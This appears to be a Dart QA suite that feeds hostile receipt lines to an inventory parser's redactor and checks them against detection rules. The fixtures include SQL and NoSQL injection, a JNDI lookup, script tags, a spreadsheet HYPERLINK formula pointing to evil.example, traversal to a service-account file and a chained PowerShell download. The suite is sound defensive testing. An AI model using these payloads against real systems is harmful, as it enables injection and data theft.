import 'dart:convert';

import '../qa_harness/qa_harness.dart';

class WorkSupplyParserSecurityPrivacySuite extends QaSuite {
  const WorkSupplyParserSecurityPrivacySuite()
    : super('inventory.security_privacy');

  static const _privateTokens = [
    '4111111111111111',
    'john.contractor@example.com',
    '804-555-1212',
    '123 Main Street',
    'AUTH 991827',
    'RECEIPT #ABC123',
  ];

  static final _hostileLines = [
    '',
    ' ',
    '\u0000\u0001PVC EL 3/4',
    '../../firebase/service-account.json',
    '<script>alert("pipe")</script>',
    '"; DROP TABLE inventory; --',
    r'${jndi:ldap://example.invalid/a}',
    List.filled(300, 'PVC').join(' '),
    'ＰＶＣ　９０　３／４',
    '3/4\u202E PVC EL',
    'card 4111111111111111 phone 804-555-1212',
    'customer john.contractor@example.com 123 Main Street',
  ];

  static final _abuseProbes = [
    _TextAbuseProbe(
      id: 'huge_repeated_token',
      riskType: 'huge_input',
      line: List.filled(5000, 'PVC').join(' '),
      expectedSignals: const ['boundedPreview', 'reviewOnly', 'localOnly'],
    ),
    _TextAbuseProbe(
      id: 'unicode_control_override',
      riskType: 'unicode_control',
      line: 'P\u0000V\u0008C 90 \u202E3/4',
      expectedSignals: const [
        'controlCharacter',
        'directionalOverride',
        'boundedPreview',
      ],
    ),
    _TextAbuseProbe(
      id: 'windows_path_like_receipt_line',
      riskType: 'path_like',
      line: r'C:\Users\rjenk\Documents\receipt.json',
      expectedSignals: const ['pathLike', 'boundedPreview', 'localOnly'],
    ),
    _TextAbuseProbe(
      id: 'posix_path_like_receipt_line',
      riskType: 'path_like',
      line: '../../firebase/service-account.json',
      expectedSignals: const ['pathLike', 'boundedPreview', 'localOnly'],
    ),
    _TextAbuseProbe(
      id: 'sqlish_sku_payload',
      riskType: 'injection_like',
      line: "SKU 12345 '; DROP TABLE inventory; --",
      expectedSignals: const ['injectionLike', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'jndiish_sku_payload',
      riskType: 'injection_like',
      line: r'SKU ${jndi:ldap://example.invalid/a}',
      expectedSignals: const ['injectionLike', 'boundedPreview', 'localOnly'],
    ),
    _TextAbuseProbe(
      id: 'long_token_dos_shape',
      riskType: 'long_token',
      line:
          'SKU '
          'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
          'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
          'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA',
      expectedSignals: const ['longToken', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'csv_formula_inventory_line',
      riskType: 'csv_formula',
      line: '=HYPERLINK("http://evil.example","3/4 PVC COUPLING")',
      expectedSignals: const [
        'csvFormula',
        'injectionLike',
        'urlLike',
        'boundedPreview',
      ],
    ),
    _TextAbuseProbe(
      id: 'local_admin_url_payload',
      riskType: 'url_like',
      line: 'J BOX http://127.0.0.1:8080/admin',
      expectedSignals: const ['urlLike', 'localAddressLike', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'command_looking_payload',
      riskType: 'command_like',
      line: 'PVC 90 3/4 && powershell -NoProfile Invoke-WebRequest bad',
      expectedSignals: const ['commandLike', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'malformed_json_payload',
      riskType: 'malformed_structured_text',
      line: '{"sku":"PVC-90","qty":',
      expectedSignals: const ['malformedStructuredText', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'environment_variable_path_payload',
      riskType: 'environment_variable',
      line: r'%USERPROFILE%\Documents\service-account.json',
      expectedSignals: const [
        'environmentVariable',
        'pathLike',
        'boundedPreview',
      ],
    ),
    _TextAbuseProbe(
      id: 'private_payment_like_material_line',
      riskType: 'private_payment_like',
      line: 'FILT 20X25X1 card 4111111111111111',
      expectedSignals: const ['privatePaymentLike', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'nosqlish_json_payload',
      riskType: 'nosql_injection_like',
      line: '{"where":{"trade":{"\$ne":"Plumbing"}}}',
      expectedSignals: const ['nosqlInjectionLike', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'regex_backtracking_payload',
      riskType: 'regex_backtracking',
      line: r'(a+)+$ aaaaaaaaaaaaaaaaaaaaaaaaaaaaa!',
      expectedSignals: const ['regexTrapLike', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'html_entity_payload',
      riskType: 'html_entity',
      line: '&lt;img src=x onerror=alert(1)&gt;',
      expectedSignals: const ['htmlEntity', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'malformed_csv_payload',
      riskType: 'malformed_csv',
      line: 'sku,name\n1,"unterminated',
      expectedSignals: const ['malformedCsv', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'unicode_homoglyph_material',
      riskType: 'unicode_homoglyph',
      line: 'ＰＶＣ　９０　３／４',
      expectedSignals: const ['unicodeHomoglyph', 'boundedPreview'],
    ),
    _TextAbuseProbe(
      id: 'dirty_pex_elbow_material',
      riskType: 'ocr_dirty_text',
      line: 'PFX E18 I/2 BR',
      expectedSignals: const ['dirtyMaterialText', 'reviewOnly'],
    ),
    _TextAbuseProbe(
      id: 'dirty_cpvc_material',
      riskType: 'ocr_dirty_text',
      line: 'CPYG 3/4 E11',
      expectedSignals: const ['dirtyMaterialText', 'reviewOnly'],
    ),
  ];

  @override
  Future<QaSuiteResult> run(QaContext context) async {
    final timer = QaStopwatch.start();
    final failures = <QaFailure>[];
    var checked = 0;

    checked += _privateTokens.length;
    for (final token in _privateTokens) {
      final redacted = context.redactor(token);
      if (redacted.contains(token)) {
        failures.add(
          QaFailure(
            suite: name,
            id: 'redactor_missed:${token.hashCode}',
            message: 'QA redactor left private-looking data intact.',
            severity: QaSeverity.critical,
            expected: 'token must be removed from summaries and JSON reports',
            actual: token,
            suggestedFix:
                'Extend QaRedactor before any parser telemetry/admin report work.',
          ),
        );
      }
    }

    checked += _hostileLines.length;
    for (final line in _hostileLines) {
      final redacted = context.redactor(line);
      if (redacted.length > line.length + 64) {
        failures.add(
          QaFailure(
            suite: name,
            id: 'redactor_expanded_hostile_line:${line.hashCode}',
            message: 'Redaction expanded hostile input unexpectedly.',
            expected: 'redaction should normalize or shrink unsafe lines',
            actual: line,
            suggestedFix:
                'Normalize hostile receipt text without amplifying report size.',
          ),
        );
      }
    }

    final riskTypes = <String>{};
    checked += _abuseProbes.length;
    for (final probe in _abuseProbes) {
      riskTypes.add(probe.riskType);
      final result = _sanitizeAbuseProbe(probe, context.redactor);
      final missingSignals = probe.expectedSignals
          .where((signal) => !result.signals.contains(signal))
          .toList(growable: false);
      if (missingSignals.isNotEmpty) {
        failures.add(
          QaFailure(
            suite: name,
            id: 'missing_abuse_signals:${probe.id}',
            message: 'Hostile parser-input probe missed expected safety flags.',
            severity: QaSeverity.critical,
            expected: probe.expectedSignals.join(', '),
            actual: result.signals.join(', '),
            suggestedFix:
                'Keep dirty text, path-like, injection-like, and oversized receipt lines classified before parser matching.',
            metadata: {
              'riskType': probe.riskType,
              'missingSignals': missingSignals,
              'safePreview': result.preview,
            },
          ),
        );
      }
      if (result.preview.length > _maxPreviewLength) {
        failures.add(
          QaFailure(
            suite: name,
            id: 'abuse_preview_too_large:${probe.id}',
            message: 'Hostile parser-input preview exceeded report budget.',
            severity: QaSeverity.critical,
            expected: '<= $_maxPreviewLength chars',
            actual: '${result.preview.length} chars',
            suggestedFix:
                'Bound hostile receipt-line previews before writing QA/admin artifacts.',
            metadata: {'riskType': probe.riskType},
          ),
        );
      }
      if (result.preview == probe.line && probe.line.length > 96) {
        failures.add(
          QaFailure(
            suite: name,
            id: 'abuse_preview_raw_echo:${probe.id}',
            message: 'Hostile parser-input preview echoed raw long input.',
            severity: QaSeverity.critical,
            expected: 'bounded sanitized preview',
            actual: result.preview,
            suggestedFix:
                'Store only a bounded diagnostic preview for oversized or hostile receipt lines.',
            metadata: {'riskType': probe.riskType},
          ),
        );
      }
    }

    checked += _requiredRiskTypes.length;
    for (final riskType in _requiredRiskTypes) {
      if (riskTypes.contains(riskType)) continue;
      failures.add(
        QaFailure(
          suite: name,
          id: 'missing_required_abuse_risk:$riskType',
          message: 'Security/privacy QA is missing a required abuse risk type.',
          severity: QaSeverity.critical,
          expected: _requiredRiskTypes.join(', '),
          actual: riskTypes.join(', '),
          suggestedFix:
              'Add parser-only hostile text probes for every required abuse family before bulk catalog expansion.',
        ),
      );
    }

    checked++;
    final report = QaReport(
      domain: 'privacy_probe',
      strict: true,
      results: [
        QaSuiteResult(
          name: name,
          duration: Duration.zero,
          checked: 1,
          failures: [
            QaFailure(
              suite: name,
              id: 'privacy_probe',
              message: 'Synthetic report must not leak private data.',
              severity: QaSeverity.critical,
              expected: 'redacted report',
              actual:
                  '4111111111111111 john.contractor@example.com '
                  '804-555-1212 123 Main Street AUTH 991827',
              metadata: const {
                'rawReceiptLine':
                    'RECEIPT #ABC123 customer john.contractor@example.com',
                'payment': '4111111111111111',
              },
            ),
          ],
        ),
      ],
      startedAt: DateTime(2026),
      duration: Duration.zero,
    );
    final encoded = const JsonEncoder().convert(report.toJson());
    final summary = report.toSummary();
    for (final token in _privateTokens) {
      if (encoded.contains(token) || summary.contains(token)) {
        failures.add(
          QaFailure(
            suite: name,
            id: 'report_leaked_private_token:${token.hashCode}',
            message: 'QA report serialization leaked private-looking data.',
            severity: QaSeverity.critical,
            expected: 'reports must be redacted at the model layer',
            actual: token,
            suggestedFix:
                'Redact every serialized string field and nested metadata value.',
          ),
        );
      }
    }

    return timer.finish(
      suite: name,
      checked: checked,
      failures: failures,
      maxFailures: context.maxFailuresPerSuite,
      metrics: {
        'privateTokenChecks': _privateTokens.length,
        'hostileLineChecks': _hostileLines.length,
        'abuseProbeChecks': _abuseProbes.length,
        'requiredRiskTypes': _requiredRiskTypes.toList(growable: false),
        'maxPreviewLength': _maxPreviewLength,
        'parserCalls': 0,
        'networkAllowed': false,
        'ocrPipelineTouched': false,
      },
    );
  }
}

const _maxPreviewLength = 96;

const _requiredRiskTypes = {
  'huge_input',
  'unicode_control',
  'path_like',
  'injection_like',
  'long_token',
  'csv_formula',
  'url_like',
  'command_like',
  'malformed_structured_text',
  'environment_variable',
  'private_payment_like',
  'nosql_injection_like',
  'regex_backtracking',
  'html_entity',
  'malformed_csv',
  'unicode_homoglyph',
  'ocr_dirty_text',
};

class _TextAbuseProbe {
  const _TextAbuseProbe({
    required this.id,
    required this.riskType,
    required this.line,
    required this.expectedSignals,
  });

  final String id;
  final String riskType;
  final String line;
  final List<String> expectedSignals;
}

class _SanitizedAbuseProbe {
  const _SanitizedAbuseProbe({required this.preview, required this.signals});

  final String preview;
  final Set<String> signals;
}

_SanitizedAbuseProbe _sanitizeAbuseProbe(
  _TextAbuseProbe probe,
  QaRedactor redactor,
) {
  final signals = <String>{'localOnly', 'boundedPreview', 'reviewOnly'};
  final line = probe.line;
  if (_containsControlCharacter(line)) signals.add('controlCharacter');
  if (line.contains('\u202E') || line.contains('\u202D')) {
    signals.add('directionalOverride');
  }
  if (_looksPathLike(line)) signals.add('pathLike');
  if (_looksInjectionLike(line)) signals.add('injectionLike');
  if (_looksCsvFormula(line)) signals.add('csvFormula');
  if (_looksUrlLike(line)) signals.add('urlLike');
  if (_looksLocalAddressLike(line)) signals.add('localAddressLike');
  if (_looksCommandLike(line)) signals.add('commandLike');
  if (_looksMalformedStructuredText(line)) {
    signals.add('malformedStructuredText');
  }
  if (_looksEnvironmentVariable(line)) signals.add('environmentVariable');
  if (_looksPrivatePaymentLike(line)) signals.add('privatePaymentLike');
  if (_looksNoSqlInjectionLike(line)) signals.add('nosqlInjectionLike');
  if (_looksRegexTrapLike(line)) signals.add('regexTrapLike');
  if (_looksHtmlEntity(line)) signals.add('htmlEntity');
  if (_looksMalformedCsv(line)) signals.add('malformedCsv');
  if (_looksUnicodeHomoglyph(line)) signals.add('unicodeHomoglyph');
  if (line.split(RegExp(r'\s+')).any((token) => token.length > 96)) {
    signals.add('longToken');
  }
  if (_looksDirtyMaterialText(line)) {
    signals.addAll({'dirtyMaterialText', 'reviewOnly'});
  }
  final normalized = _stripUnsafeControls(redactor(line));
  final preview = normalized.length <= _maxPreviewLength
      ? normalized
      : '${normalized.substring(0, _maxPreviewLength - 3)}...';
  return _SanitizedAbuseProbe(preview: preview, signals: signals);
}

bool _containsControlCharacter(String value) {
  for (final codeUnit in value.codeUnits) {
    if (codeUnit < 32 && codeUnit != 9 && codeUnit != 10 && codeUnit != 13) {
      return true;
    }
  }
  return false;
}

String _stripUnsafeControls(String value) {
  final buffer = StringBuffer();
  for (final codeUnit in value.codeUnits) {
    final isSafeWhitespace = codeUnit == 9 || codeUnit == 10 || codeUnit == 13;
    if (codeUnit >= 32 || isSafeWhitespace) {
      buffer.writeCharCode(codeUnit);
    } else {
      buffer.write('?');
    }
  }
  return buffer.toString().replaceAll(RegExp(r'\s+'), ' ').trim();
}

bool _looksPathLike(String value) {
  final lower = value.toLowerCase();
  return lower.contains(':\\') ||
      lower.contains('../') ||
      lower.contains('..\\') ||
      lower.contains('/firebase/') ||
      lower.contains('service-account') ||
      lower.contains(r'%userprofile%');
}

bool _looksInjectionLike(String value) {
  final lower = value.toLowerCase();
  return lower.contains('drop table') ||
      lower.contains('<script') ||
      lower.contains(r'${jndi:') ||
      lower.contains('ldap://') ||
      lower.contains('--') ||
      lower.contains('hyperlink(');
}

bool _looksCsvFormula(String value) {
  final trimmed = value.trimLeft();
  return trimmed.startsWith('=') ||
      trimmed.startsWith('+') ||
      trimmed.startsWith('-') ||
      trimmed.startsWith('@');
}

bool _looksUrlLike(String value) {
  final lower = value.toLowerCase();
  return lower.contains('http://') ||
      lower.contains('https://') ||
      lower.contains('ldap://');
}

bool _looksLocalAddressLike(String value) {
  final lower = value.toLowerCase();
  return lower.contains('127.0.0.1') ||
      lower.contains('localhost') ||
      lower.contains('0.0.0.0');
}

bool _looksCommandLike(String value) {
  final lower = value.toLowerCase();
  return lower.contains('powershell') ||
      lower.contains('cmd.exe') ||
      lower.contains('invoke-webrequest') ||
      lower.contains('&&');
}

bool _looksMalformedStructuredText(String value) {
  final trimmed = value.trim();
  return (trimmed.startsWith('{') && !trimmed.endsWith('}')) ||
      (trimmed.startsWith('[') && !trimmed.endsWith(']')) ||
      trimmed.contains('unterminated');
}

bool _looksEnvironmentVariable(String value) {
  final lower = value.toLowerCase();
  return lower.contains(r'%userprofile%') ||
      lower.contains(r'${') ||
      lower.contains(r'$env:');
}

bool _looksPrivatePaymentLike(String value) {
  return RegExp(r'\b\d{13,19}\b').hasMatch(value);
}

bool _looksNoSqlInjectionLike(String value) {
  final lower = value.toLowerCase();
  return lower.contains(r'$ne') ||
      lower.contains(r'$where') ||
      lower.contains('"where"') ||
      lower.contains(r'{"$');
}

bool _looksRegexTrapLike(String value) {
  return value.contains('(a+)+') ||
      value.contains('([a-z]+)+') ||
      value.contains('(.*)+');
}

bool _looksHtmlEntity(String value) {
  final lower = value.toLowerCase();
  return lower.contains('&lt;') ||
      lower.contains('&gt;') ||
      lower.contains('&quot;') ||
      lower.contains('&#');
}

bool _looksMalformedCsv(String value) {
  return value.contains(',') &&
      value.contains('\n') &&
      value.split('"').length.isEven;
}

bool _looksUnicodeHomoglyph(String value) {
  return value.codeUnits.any((unit) => unit >= 0xFF00 && unit <= 0xFFEF);
}

bool _looksDirtyMaterialText(String value) {
  final normalized = value.toUpperCase().replaceAll(
    RegExp(r'[^A-Z0-9/]+'),
    ' ',
  );
  return normalized.contains('PFX') ||
      normalized.contains('E18') ||
      normalized.contains('CPYG') ||
      normalized.contains('E11') ||
      normalized.contains('I/2');
}
